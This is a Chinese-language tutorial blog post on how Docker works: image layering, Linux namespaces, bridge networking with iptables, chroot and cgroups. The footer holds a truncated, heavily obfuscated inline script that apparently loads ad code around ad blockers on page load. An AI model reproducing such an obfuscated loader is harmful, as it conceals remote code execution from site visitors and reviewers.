<p><img src="https://images2.imgbox.com/fa/bf/hr8zUm1n_o.png" alt="在这里插入图片描述"></p> 
<p>Docker Image 是有一个层级结构的，最底层的 Layer 为 BaseImage（一般为一个操作系统的 ISO 镜像），然后顺序执行每一条指令，生成的 Layer 按照入栈的顺序逐渐累加，最终形成一个 Image。</p> 
<p>直观的角度来说，是这个图所示：</p> 
<p><img src="https://images2.imgbox.com/90/94/hCc2UK72_o.png" alt="在这里插入图片描述"></p> 
<p>每一次都是一个被联合的目录，从目录的角度来说，大致如下图所示：</p> 
<p><img src="https://images2.imgbox.com/7f/fb/fA7g4MXI_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="Docker_Image__464"></a>Docker Image 如何而来呢？</h4> 
<p>简单来说，一个 Image 是通过一个 DockerFile 定义的，然后使用 docker build 命令构建它。</p> 
<p>DockerFile 中的每一条命令的执行结果都会成为 Image 中的一个 Layer。</p> 
<p>这里，我们通过 Build 一个镜像，来观察 Image 的分层机制：</p> 
<p>Dockerfile:</p> 
<pre><code class="prism language-text"># Use an official Python runtime as a parent image
FROM python:2.7-slim

# Set the working directory to /app
WORKDIR /app

# Copy the current directory contents into the container at /app
COPY . /app

# Install any needed packages specified in requirements.txt
RUN pip install --trusted-host pypi.python.org -r requirements.txt

# Make port 80 available to the world outside this container
EXPOSE 80

# Define environment variable
ENV NAME World

# Run app.py when the container launches
CMD ["python", "app.py"]
</code></pre> 
<p>构建结果：</p> 
<pre><code class="prism language-c">root@rds<span class="token operator">-</span>k8s<span class="token operator">-</span><span class="token number">18</span><span class="token operator">-</span>svr0<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>xuran<span class="token operator">/</span>exampleimage# docker build <span class="token operator">-</span>t hello <span class="token punctuation">.</span><span class="token operator">/</span>
Sending build context to Docker daemon  <span class="token number">5.12</span> kB
Step <span class="token number">1</span><span class="token operator">/</span><span class="token number">7</span> <span class="token operator">:</span> FROM python<span class="token operator">:</span><span class="token number">2.7</span><span class="token operator">-</span>slim
 <span class="token operator">--</span><span class="token operator">-&gt;</span> <span class="token number">804</span>b0a01ea83
Step <span class="token number">2</span><span class="token operator">/</span><span class="token number">7</span> <span class="token operator">:</span> WORKDIR <span class="token operator">/</span>app
 <span class="token operator">--</span><span class="token operator">-&gt;</span> Using cache
 <span class="token operator">--</span><span class="token operator">-&gt;</span> <span class="token number">6</span>d93c5b91703
Step <span class="token number">3</span><span class="token operator">/</span><span class="token number">7</span> <span class="token operator">:</span> COPY <span class="token punctuation">.</span> <span class="token operator">/</span>app
 <span class="token operator">--</span><span class="token operator">-&gt;</span> Using cache
 <span class="token operator">--</span><span class="token operator">-&gt;</span> feddc82d321b
Step <span class="token number">4</span><span class="token operator">/</span><span class="token number">7</span> <span class="token operator">:</span> RUN pip install <span class="token operator">--</span>trusted<span class="token operator">-</span>host pypi<span class="token punctuation">.</span>python<span class="token punctuation">.</span>org <span class="token operator">-</span>r requirements<span class="token punctuation">.</span>txt
 <span class="token operator">--</span><span class="token operator">-&gt;</span> Using cache
 <span class="token operator">--</span><span class="token operator">-&gt;</span> <span class="token number">94695</span>df5e14d
Step <span class="token number">5</span><span class="token operator">/</span><span class="token number">7</span> <span class="token operator">:</span> EXPOSE <span class="token number">81</span>
 <span class="token operator">--</span><span class="token operator">-&gt;</span> Using cache
 <span class="token operator">--</span><span class="token operator">-&gt;</span> <span class="token number">43</span>c392d51dff
Step <span class="token number">6</span><span class="token operator">/</span><span class="token number">7</span> <span class="token operator">:</span> ENV NAME World
 <span class="token operator">--</span><span class="token operator">-&gt;</span> Using cache
 <span class="token operator">--</span><span class="token operator">-&gt;</span> <span class="token number">78</span>c9a60237c8
Step <span class="token number">7</span><span class="token operator">/</span><span class="token number">7</span> <span class="token operator">:</span> CMD python app<span class="token punctuation">.</span>py
 <span class="token operator">--</span><span class="token operator">-&gt;</span> Using cache
 <span class="token operator">--</span><span class="token operator">-&gt;</span> a5ccd4e1b15d
Successfully built a5ccd4e1b15d
</code></pre> 
<p>通过构建结果可以看出，构建的过程就是执行 Dockerfile 文件中我们写入的命令。构建一共进行了7个步骤，每个步骤进行完都会生成一个随机的 ID，来标识这一 layer 中的内容。 最后一行的 a5ccd4e1b15d 为镜像的 ID。由于我贴上来的构建过程已经是构建了第二次的结果了，所以可以看出，对于没有任何修改的内容，Docker 会复用之前的结果。</p> 
<p>如果 DockerFile 中的内容没有变动，那么相应的镜像在 build 的时候会复用之前的 layer，以便提升构建效率。并且，即使文件内容有修改，那也只会重新 build 修改的 layer，其他未修改的也仍然会复用。</p> 
<p>通过了解了 Docker Image 的分层机制，我们多多少少能够感觉到，Layer 和 Image 的关系与 AUFS 中的联合目录和挂载点的关系比较相似。</p> 
<p>而 Docker 也正是通过 AUFS 来管理 Images 的。</p> 
<h3><a id="Namespaces_542"></a>Namespaces</h3> 
<p>在Linux系统中，Namespace是在内核级别以一种抽象的形式来封装系统资源，通过将系统资源放在不同的Namespace中，来实现资源隔离的目的。不同的Namespace程序，可以享有一份独立的系统资源。</p> 
<p>命名空间（namespaces）是 Linux 为我们提供的用于分离进程树、网络接口、挂载点以及进程间通信等资源的方法。在日常使用 Linux 或者 macOS 时，我们并没有运行多个完全分离的服务器的需要，但是如果我们在服务器上启动了多个服务，这些服务其实会相互影响的，每一个服务都能看到其他服务的进程，也可以访问宿主机器上的任意文件，这是很多时候我们都不愿意看到的，我们更希望运行在同一台机器上的不同服务能做到完全隔离，就像运行在多台不同的机器上一样。</p> 
<p>Linux 的命名空间机制提供了以下七种不同的命名空间，包括 :</p> 
<ul><li>CLONE_NEWCGROUP、</li><li>CLONE_NEWIPC、</li><li>CLONE_NEWNET、</li><li>CLONE_NEWNS、</li><li>CLONE_NEWPID、</li><li>CLONE_NEWUSER 和</li><li>CLONE_NEWUTS，</li></ul> 
<p>通过这七个选项, 我们能在创建新的进程时, 设置新进程应该在哪些资源上与宿主机器进行隔离。具体如下：</p> 
<table><thead><tr><th align="center"><strong>Namespace</strong></th><th align="center"><strong>Flag</strong></th><th align="center"><strong>Page</strong></th><th align="center"><strong>Isolates</strong></th></tr></thead><tbody><tr><td align="center">Cgroup</td><td align="center"><strong>CLONE_NEWCGROUP</strong></td><td align="center"><strong>cgroup_namespaces</strong></td><td align="center">Cgroup root directory</td></tr><tr><td align="center">IPC</td><td align="center"><strong>CLONE_NEWIPC</strong></td><td align="center"><strong>ipc_namespaces</strong></td><td align="center">System V IPC,POSIX message queues 隔离进程间通信</td></tr><tr><td align="center">Network</td><td align="center"><strong>CLONE_NEWNET</strong></td><td align="center"><strong>network_namespaces</strong></td><td align="center">Network devices,stacks, ports, etc. 隔离网络资源</td></tr><tr><td align="center">Mount</td><td align="center"><strong>CLONE_NEWNS</strong></td><td align="center"><strong>mount_namespaces</strong></td><td align="center">Mount points 隔离文件系统挂载点</td></tr><tr><td align="center">PID</td><td align="center"><strong>CLONE_NEWPID</strong></td><td align="center"><strong>pid_namespaces</strong></td><td align="center">Process IDs 隔离进程的ID</td></tr><tr><td align="center">Time</td><td align="center"><strong>CLONE_NEWTIME</strong></td><td align="center"><strong>time_namespaces</strong></td><td align="center">Boot and monotonic clocks</td></tr><tr><td align="center">User</td><td align="center"><strong>CLONE_NEWUSER</strong></td><td align="center"><strong>user_namespaces</strong></td><td align="center">User and group IDs 隔离用户和用户组的ID</td></tr><tr><td align="center">UTS</td><td align="center"><strong>CLONE_NEWUTS</strong></td><td align="center"><strong>uts_namespaces</strong></td><td align="center">Hostname and NIS domain name 隔离主机名和域名信息</td></tr></tbody></table> 
<p>这里提出一个问题，在宿主机上启动两个容器，在这两个容器内都各有一个 PID=1的进程，众所周知，Linux 里 PID 是唯一的，既然 Docker 不是跑在宿主机上的两个虚拟机，那么它是如何实现在宿主机上运行两个相同 PID 的进程呢？</p> 
<p>这里就用到了 Linux Namespaces，它其实是 Linux 创建新进程时的一个可选参数，在 Linux 系统中创建进程的系统调用是 clone()方法。</p> 
<pre><code>int clone(int (*fn) (void *)，void *child stack,
          int flags， void *arg， . . .
         /* pid_ t *ptid, void *newtls, pid_ t *ctid */ ) ;
</code></pre> 
<p><img src="https://images2.imgbox.com/d5/99/zX8LFkCd_o.png" alt="在这里插入图片描述"></p> 
<p>通过调用这个方法，这个进程会获得一个独立的进程空间，它的 pid 是1，并且看不到宿主机上的其他进程，这也就是在容器内执行 PS 命令的结果。</p> 
<p>不仅仅是 PID，当你启动启动容器之后，Docker 会为这个容器创建一系列其他 namespaces。</p> 
<p>这些 namespaces 提供了不同层面的隔离。容器的运行受到各个层面 namespace 的限制。</p> 
<p>Docker Engine 使用了以下 Linux 的隔离技术:</p> 
<p>The pid namespace: 管理 PID 命名空间 (PID: Process ID).</p> 
<p>The net namespace: 管理网络命名空间(NET: Networking).</p> 
<p>The ipc namespace: 管理进程间通信命名空间(IPC: InterProcess Communication).</p> 
<p>The mnt namespace: 管理文件系统挂载点命名空间 (MNT: Mount).</p> 
<p>The uts namespace: Unix 时间系统隔离. (UTS: Unix Timesharing System).</p> 
<p>通过这些技术，运行时的容器得以看到一个和宿主机上其他容器隔离的环境。</p> 
<h4><a id="_619"></a>进程隔离</h4> 
<p>进程是 Linux 以及现在操作系统中非常重要的概念，它表示一个正在执行的程序，也是在现代分时系统中的一个任务单元。</p> 
<p>在每一个 *nix 的操作系统上，我们都能够通过 ps 命令打印出当前操作系统中正在执行的进程，比如在 Ubuntu 上，使用该命令就能得到以下的结果：</p> 
<pre><code>|$ ps -ef
UID		PID		PPID	C 	STIME 	TTY          TIME CMD
root     1       0  	0   Apr08 	 ?      00:00:09 /sbin/init
root     2       0  	0   Apr08 	 ?      00:00:00 [kthreadd]
root     3       2  	0   Apr08	 ?      00:00:05 [ksoftirqd/0]
root     5       2  	0   Apr08 	 ?      00:00:00 [kworker/0:0H]
root     7       2  	0   Apr08 	 ?     	00:07:10 [rcu_sched]
root    39       2  	0   Apr08 	 ?      00:00:00 [migration/0]
root    40       2  	0   Apr08 	 ?      00:01:54 [watchdog/0]

</code></pre> 
<p>当前机器上有很多的进程正在执行，在上述进程中有两个非常特殊，一个是 pid 为 1 的 /sbin/init 进程，另一个是 pid 为 2 的 kthreadd 进程，这两个进程都是被 Linux 中的上帝进程 idle 创建出来的，其中前者负责执行内核的一部分初始化工作和系统配置，也会创建一些类似 getty 的注册进程，而后者负责管理和调度其他的内核进程。</p> 
<p><img src="https://images2.imgbox.com/4b/c3/mAv3CXvf_o.png" alt="在这里插入图片描述"></p> 
<p>如果我们在当前的 Linux 操作系统下运行一个新的 Docker 容器，并通过 exec 进入其内部的 bash 并打印其中的全部进程，我们会得到以下的结果：</p> 
<pre><code>UID        PID  PPID  C STIME TTY          TIME CMD
root     29407     1  0 Nov16 ?        00:08:38 /usr/bin/dockerd --raw-logs
root      1554 29407  0 Nov19 ?        00:03:28 docker-containerd -l unix:///var/run/docker/libcontainerd/docker-containerd.sock --metrics-interval=0 --start-timeout 2m --state-dir /var/run/docker/libcontainerd/containerd --shim docker-containerd-shim --runtime docker-runc
root      5006  1554  0 08:38 ?        00:00:00 docker-containerd-shim b809a2eb3630e64c581561b08ac46154878ff1c61c6519848b4a29d412215e79 /var/run/docker/libcontainerd/b809a2eb3630e64c581561b08ac46154878ff1c61c6519848b4a29d412215e79 docker-runc

</code></pre> 
<p>在新的容器内部执行 ps 命令打印出了非常干净的进程列表，只有包含当前 ps -ef 在内的三个进程，在宿主机器上的几十个进程都已经消失不见了。</p> 
<p>当前的 Docker 容器成功将容器内的进程与宿主机器中的进程隔离，如果我们在宿主机器上打印当前的全部进程时，会得到下面三条与 Docker 相关的结果：</p> 
<p>在当前的宿主机器上，可能就存在由上述的不同进程构成的进程树：<img src="https://images2.imgbox.com/aa/fd/CI7osxiE_o.png" alt="在这里插入图片描述"><br> 这就是在使用 clone(2) 创建新进程时传入 CLONE_NEWPID 实现的，也就是使用 Linux 的命名空间实现进程的隔离，Docker 容器内部的任意进程都对宿主机器的进程一无所知。</p> 
<pre><code>containerRouter.postContainersStart
└── daemon.ContainerStart
└── daemon.createSpec
    └── setNamespaces
        └── setNamespace

</code></pre> 
<p>Docker 的容器就是使用上述技术实现与宿主机器的进程隔离，当我们每次运行 docker run 或者 docker start 时，都会在下面的方法中创建一个用于设置进程间隔离的 Spec：</p> 
<pre><code>func (daemon *Daemon) createSpec(c *container.Container) (*specs.Spec, error) {
s := oci.DefaultSpec()

// ...
if err := setNamespaces(daemon, &amp;s, c); err != nil {
    return nil, fmt.Errorf("linux spec namespaces: %v", err)
}

return &amp;s, nil
} 

</code></pre> 
<p>在 setNamespaces 方法中不仅会设置进程相关的命名空间，还会设置与用户、网络、IPC 以及 UTS 相关的命名空间：</p> 
<pre><code>func setNamespaces(daemon *Daemon, s *specs.Spec, c *container.Container) error {
// user
// network
// ipc
// uts

// pid
if c.HostConfig.PidMode.IsContainer() {
    ns := specs.LinuxNamespace{Type: "pid"}
    pc, err := daemon.getPidContainer(c)
    if err != nil {
        return err
    }
    ns.Path = fmt.Sprintf("/proc/%d/ns/pid", pc.State.GetPID())
    setNamespace(s, ns)
} else if c.HostConfig.PidMode.IsHost() {
    oci.RemoveNamespace(s, specs.LinuxNamespaceType("pid"))
} else {
    ns := specs.LinuxNamespace{Type: "pid"}
    setNamespace(s, ns)
}

return nil
} 

</code></pre> 
<p>所有命名空间相关的设置 Spec 最后都会作为 Create 函数的入参在创建新的容器时进行设置：</p> 
<pre><code> daemon.containerd.Create(context.Background(), container.ID, spec, createOptions)

</code></pre> 
<p>所有与命名空间的相关的设置都是在上述的两个函数中完成的，Docker 通过命名空间成功完成了与宿主机进程和网络的隔。</p> 
<h4><a id="_725"></a>网络隔离</h4> 
<p>如果 Docker 的容器通过 Linux 的命名空间完成了与宿主机进程的网络隔离，但是却有没有办法通过宿主机的网络与整个互联网相连，就会产生很多限制。</p> 
<p>所以 Docker 虽然可以通过命名空间创建一个隔离的网络环境，但是 Docker 中的服务仍然需要与外界相连才能发挥作用。<br> 每一个使用 docker run 启动的容器其实都具有单独的网络命名空间，Docker 为我们提供了四种不同的网络模式，Host、Container、None 和 Bridge 模式。<img src="https://images2.imgbox.com/72/e2/3QxQskI3_o.png" alt="在这里插入图片描述"></p> 
<p>在这一部分，我们将介绍 Docker 默认的网络设置模式：网桥模式。</p> 
<p>在这种模式下，除了分配隔离的网络命名空间之外，Docker 还会为所有的容器设置 IP 地址。</p> 
<p>当 Docker 服务器在主机上启动之后会创建新的虚拟网桥 docker0，随后在该主机上启动的全部服务在默认情况下都与该网桥相连。</p> 
<p><img src="https://images2.imgbox.com/96/f0/Jey1gePp_o.png" alt="在这里插入图片描述"></p> 
<p>在默认情况下，每一个容器在创建时都会创建一对虚拟网卡，两个虚拟网卡组成了数据的通道，其中一个会放在创建的容器中，会加入到名为 docker0 网桥中。</p> 
<p>我们可以使用如下的命令来查看当前网桥的接口：</p> 
<pre><code>$ brctl show
bridge name bridge id       STP enabled interfaces
docker0     8000.0242a6654980   no      veth3e84d4f
 veth9953b75

</code></pre> 
<p>docker0会为每一个容器分配一个新的 IP 地址并将 docker0 的 IP 地址设置为默认的网关。</p> 
<p>网桥 docker0 通过 iptables 中的配置与宿主机器上的网卡相连，所有符合条件的请求都会通过 iptables 转发到 docker0 并由网桥分发给对应的机器。</p> 
<pre><code>$ iptables -t nat -L
Chain PREROUTING (policy ACCEPT)
target     prot opt source               destination
DOCKER     all  --  anywhere             anywhere             ADDRTYPE match dst-type LOCAL

Chain DOCKER (2 references)
target     prot opt source               destination
RETURN     all  --  anywhere             anywhere

</code></pre> 
<p>我们在当前的机器上使用 docker run -d -p 6379:6379 redis 命令启动了一个新的 Redis 容器，在这之后我们再查看当前 iptables 的 NAT 配置就会看到在 DOCKER 的链中出现了一条新的规则：</p> 
<pre><code>DNAT       tcp  --  anywhere             anywhere             tcp dpt:6379 to:192.168.0.4:6379

</code></pre> 
<p>上述规则会将从任意源发送到当前机器 6379 端口的 TCP 包转发到 192.168.0.4:6379 所在的地址上。</p> 
<p>这个地址其实也是 Docker 为 Redis 服务分配的 IP 地址，如果我们在当前机器上直接 ping 这个 IP 地址就会发现它是可以访问到的：</p> 
<pre><code>$ ping 192.168.0.4
PING 192.168.0.4 (192.168.0.4) 56(84) bytes of data.
64 bytes from 192.168.0.4: icmp_seq=1 ttl=64 time=0.069 ms
64 bytes from 192.168.0.4: icmp_seq=2 ttl=64 time=0.043 ms
^C
--- 192.168.0.4 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 999ms
rtt min/avg/max/mdev = 0.043/0.056/0.069/0.013 ms

</code></pre> 
<p>从上述的一系列现象，我们就可以推测出 Docker 是如何将容器的内部的端口暴露出来并对数据包进行转发的了；当有 Docker 的容器需要将服务暴露给宿主机器，就会为容器分配一个 IP 地址，同时向 iptables 中追加一条新的规则。</p> 
<p><img src="https://images2.imgbox.com/5a/02/arHXC90P_o.png" alt="在这里插入图片描述"><br> 当我们使用 redis-cli 在宿主机器的命令行中访问 127.0.0.1:6379 的地址时，经过 iptables 的 NAT PREROUTING 将 ip 地址定向到了 192.168.0.4，重定向过的数据包就可以通过 iptables 中的 FILTER 配置，最终在 NAT POSTROUTING 阶段将 ip 地址伪装成 127.0.0.1，到这里虽然从外面看起来我们请求的是 127.0.0.1:6379，但是实际上请求的已经是 Docker 容器暴露出的端口了。</p> 
<pre><code>$ redis-cli -h 127.0.0.1 -p 6379 ping
PONG

</code></pre> 
<p>Docker 通过 Linux 的命名空间实现了网络的隔离，又通过 iptables 进行数据包转发，让 Docker 容器能够优雅地为宿主机器或者其他容器提供服务。</p> 
<h4><a id="Libnetwork_808"></a>Libnetwork</h4> 
<p>整个网络部分的功能都是通过 Docker 拆分出来的 libnetwork 实现的，它提供了一个连接不同容器的实现，同时也能够为应用给出一个能够提供一致的编程接口和网络层抽象的容器网络模型。<br> The goal of libnetwork is to deliver a robust Container Network Model that provides a consistent programming interface and the required network abstractions for applications.</p> 
<p>libnetwork 中最重要的概念，容器网络模型由以下的几个主要组件组成，分别是 Sandbox、Endpoint 和 Network：<img src="https://images2.imgbox.com/6a/e6/zsjpNGkK_o.png" alt="在这里插入图片描述"><br> 在容器网络模型中，每一个容器内部都包含一个 Sandbox，其中存储着当前容器的网络栈配置，包括容器的接口、路由表和 DNS 设置，Linux 使用网络命名空间实现这个 Sandbox，每一个 Sandbox 中都可能会有一个或多个 Endpoint，在 Linux 上就是一个虚拟的网卡 veth，Sandbox 通过 Endpoint 加入到对应的网络中，这里的网络可能就是我们在上面提到的 Linux 网桥或者 VLAN。</p> 
<p><strong>挂载点</strong><br> 虽然我们已经通过 Linux 的命名空间解决了进程和网络隔离的问题，在 Docker 进程中我们已经没有办法访问宿主机器上的其他进程并且限制了网络的访问，但是 Docker 容器中的进程仍然能够访问或者修改宿主机器上的其他目录，这是我们不希望看到的。</p> 
<p>在新的进程中创建隔离的挂载点命名空间需要在 clone 函数中传入 CLONE_NEWNS，这样子进程就能得到父进程挂载点的拷贝，如果不传入这个参数子进程对文件系统的读写都会同步回父进程以及整个主机的文件系统。</p> 
<p>如果一个容器需要启动，那么它一定需要提供一个根文件系统（rootfs），容器需要使用这个文件系统来创建一个新的进程，所有二进制的执行都必须在这个根文件系统中。<img src="https://images2.imgbox.com/05/dd/PJB2tB1Z_o.png" alt="在这里插入图片描述"><br> 想要正常启动一个容器就需要在 rootfs 中挂载以上的几个特定的目录，除了上述的几个目录需要挂载之外我们还需要建立一些符号链接保证系统 IO 不会出现问题。</p> 
<p>为了保证当前的容器进程没有办法访问宿主机器上其他目录，我们在这里还需要通过 libcotainer 提供的 pivor_root 或者 chroot 函数改变进程能够访问个文件目录的根节点。</p> 
<pre><code>// pivor_root
put_old = mkdir(...);
pivot_root(rootfs, put_old);
chdir("/");
unmount(put_old, MS_DETACH);
rmdir(put_old);

// chroot
mount(rootfs, "/", NULL, MS_MOVE, NULL);
chroot(".");
chdir("/");

</code></pre> 
<p>到这里我们就将容器需要的目录挂载到了容器中，同时也禁止当前的容器进程访问宿主机器上的其他目录，保证了不同文件系统的隔离。</p> 
<h4><a id="Chroot_843"></a><strong>Chroot</strong></h4> 
<p>在这里不得不简单介绍一下 chroot（change root），在 Linux 系统中，系统默认的目录就都是以 / 也就是根目录开头的，chroot 的使用能够改变当前的系统根目录结构，通过改变当前系统的根目录，我们能够限制用户的权利，在新的根目录下并不能够访问旧系统根目录的结构个文件，也就建立了一个与原系统完全隔离的目录结构。</p> 
<h3><a id="CGroups_847"></a>CGroups物理资源限制分组</h3> 
<p>我们通过 Linux 的命名空间为新创建的进程隔离了文件系统、网络并与宿主机器之间的进程相互隔离，但是命名空间并不能够为我们提供物理资源上的隔离，比如 CPU 或者内存，如果在同一台机器上运行了多个对彼此以及宿主机器一无所知的『容器』，这些容器却共同占用了宿主机器的物理资源。<br> <img src="https://images2.imgbox.com/ca/19/exzFqPcE_o.png" alt="在这里插入图片描述"></p> 
<p>如果其中的某一个容器正在执行 CPU 密集型的任务，那么就会影响其他容器中任务的性能与执行效率，导致多个容器相互影响并且抢占资源。如何对多个容器的资源使用进行限制就成了解决进程虚拟资源隔离之后的主要问题，而 Control Groups（简称 CGroups）就是能够隔离宿主机器上的物理资源，例如 CPU、内存、磁盘 I/O 和网络带宽。</p> 
<p>每一个 CGroup 都是一组被相同的标准和参数限制的进程，不同的 CGroup 之间是有层级关系的，也就是说它们之间可以从父类继承一些用于限制资源使用的标准和参数。<br> Linux 的 CGroup 能够为一组进程分配资源，也就是我们在上面提到的 CPU、内存、网络带宽等资源，通过对资源的分配。<br> Linux 使用文件系统来实现 CGroup，我们可以直接使用下面的命令查看当前的 CGroup 中有哪些子系统：</p> 
<pre><code>$ lssubsys -m
cpuset /sys/fs/cgroup/cpuset
cpu /sys/fs/cgroup/cpu
cpuacct /sys/fs/cgroup/cpuacct
memory /sys/fs/cgroup/memory
devices /sys/fs/cgroup/devices
freezer /sys/fs/cgroup/freezer
blkio /sys/fs/cgroup/blkio
perf_event /sys/fs/cgroup/perf_event
hugetlb /sys/fs/cgroup/hugetlb

</code></pre> 
<p>大多数 Linux 的发行版都有着非常相似的子系统，而之所以将上面的 cpuset、cpu 等东西称作子系统，是因为它们能够为对应的控制组分配资源并限制资源的使用。</p> 
<p>如果我们想要创建一个新的 cgroup 只需要在想要分配或者限制资源的子系统下面创建一个新的文件夹，然后这个文件夹下就会自动出现很多的内容，如果你在 Linux 上安装了 Docker，你就会发现所有子系统的目录下都有一个名为 Docker 的文件夹：</p> 
<pre><code>$ ls cpu
cgroup.clone_children  
...
cpu.stat  
docker  
notify_on_release 
release_agent 
tasks

$ ls cpu/docker/
9c3057f1291b53fd54a3d12023d2644efe6a7db6ddf330436ae73ac92d401cf1 
cgroup.clone_children  
...
cpu.stat  
notify_on_release 
release_agent 
tasks

</code></pre> 
<p>9c3057xxx 其实就是我们运行的一个 Docker 容器，启动这个容器时，Docker 会为这个容器创建一个与容器标识符相同的 CGroup，在当前的主机上 CGroup 就会有以下的层级关系：<img src="https://images2.imgbox.com/27/61/W2bA8uXk_o.png" alt="在这里插入图片描述"><br> 每一个 CGroup 下面都有一个 tasks 文件，其中存储着属于当前控制组的所有进程的 pid，作为负责 cpu 的子系统，cpu.cfs_quota_us 文件中的内容能够对 CPU 的使用作出限制，如果当前文件的内容为 50000，那么当前控制组中的全部进程的 CPU 占用率不能超过 50%。</p> 
<p>如果系统管理员想要控制 Docker 某个容器的资源使用率就可以在 docker 这个父控制组下面找到对应的子控制组并且改变它们对应文件的内容，当然我们也可以直接在程序运行时就使用参数，让 Docker 进程去改变相应文件中的内容。</p> 
<p>当我们使用 Docker 关闭掉正在运行的容器时，Docker 的子控制组对应的文件夹也会被 Docker 进程移除，Docker 在使用 CGroup 时其实也只是做了一些创建文件夹改变文件内容的文件操作，不过 CGroup 的使用也确实解决了我们限制子容器资源占用的问题，系统管理员能够为多个容器合理的分配资源并且不会出现多个容器互相抢占资源的问题。</p> 
<h3><a id="dockersLXCAUFS_904"></a>总之：dockers=LXC+AUFS</h3> 
<p>docker为LXC+AUFS组合：</p> 
<ul><li>LXC负责资源管理</li><li>AUFS负责镜像管理；</li></ul> 
<p>而LXC包括cgroup，namespace，chroot等组件，并通过cgroup资源管理，那么，从资源管理的角度来看，Docker，Lxc,Cgroup三者的关系是怎样的呢？</p> 
<p>cgroup是在底层落实资源管理，LXC在cgroup上面封装了一层，随后，docker有在LXC封装了一层；</p> 
<p><img src="https://images2.imgbox.com/f4/df/btxqGw9m_o.png" alt="在这里插入图片描述"></p> 
<p><strong>Cgroup其实就是linux提供的一种限制，记录，隔离进程组所使用的物理资源管理机制；也就是说，Cgroup是LXC为实现虚拟化所使用资源管理手段，我们可以这样说，底层没有cgroup支持，也就没有lxc，更别说docker的存在了，这是我们需要掌握和理解的，三者之间的关系概念</strong></p> 
<p>​ 我们在把重心转移到LXC这个相当于中间件上，上述我们提到LXC是建立在cgroup基础上的，我们可以粗略的认为<strong>LXC=Cgroup+namespace+Chroot+veth+用户控制脚本；LXC利用内核的新特性（cgroup）来提供用户空间的对象，用来保证资源的隔离和对应用系统资源的限制；</strong></p> 
<p>​ Docker容器的文件系统最早是建立在Aufs基础上的，Aufs是一种Union FS，简单来说就<strong>是支持将不同的目录挂载到同一个虚拟文件系统之下</strong></p> 
<p><strong>并实现一种laver的概念,</strong></p> 
<p>由于Aufs未能加入到linux内核中，考虑到兼容性的问题，便加入了Devicemapper的支持，Docker目前默认是建立在Devicemapper基础上，</p> 
<p>**devicemapper用户控件相关部分主要负责配置具体的策略和控制逻辑，**比如逻辑设备和哪些物理设备建立映射，怎么建立这些映射关系等，而具体过滤和重定向IO请求的工作有内核中相关代码完成，因此整个device mapper机制由两部分组成–内核空间的device mapper驱动，用户控件的device mapper库以及它提供的dmsetup工具；</p> 
<h3><a id="_941"></a>参考资料</h3> 
<p>https://docs.docker.com/storage/storagedriver/aufs-driver/#how-the-aufs-storage-driver-works</p> 
<p>https://github.com/opencontainers/runc</p> 
<p>http://www.sel.zju.edu.cn/?p=840</p> 
<p>https://draveness.me/docker/</p> 
<p>https://blog.csdn.net/wangqingjiewa/article/details/85000393</p> 
<p>https://zhuanlan.zhihu.com/p/47683490</p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/7d6c5d219a16f38edc3858bcf403641c/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">cat命令详解</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/fd40ea54afdd41eb7c3240a3a6183571/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">玩转console.log 如何在console.log里面插入图片</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程爱好者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return 